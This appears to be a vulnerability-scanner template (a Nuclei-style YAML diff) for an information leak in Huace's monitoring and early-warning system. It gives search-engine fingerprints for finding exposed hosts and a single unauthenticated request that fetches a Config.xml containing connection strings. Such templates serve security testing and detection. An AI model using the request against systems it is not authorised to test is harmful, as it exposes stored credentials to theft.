@@ -1,0 +1,29 @@
+id: huace-mews-config-xml-infoleak
+
+info:
+  name: 华测监测预警系统 config.xml 信息泄露
+  author: SleepingBag945
+  severity: high
+  description: |-
+    上海华测导航技术股份有限公司的华测监测预警系统可下载任意文件，如web.config文件等。
+    FOFA: icon_hash="-628229493"
+    HUNTER: web.icon=="be8e2d43a4e9bc5ce43303ce55609199"
+  tags: huace
+
+http:
+  - raw:
+      - |
+        GET /web/Report/Rpt/Config/Config.xml HTTP/1.1
+        Host: {{Hostname}}
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'configuration'
+          - 'appSettings'
+          - 'connectionStrings'
+        condition: and
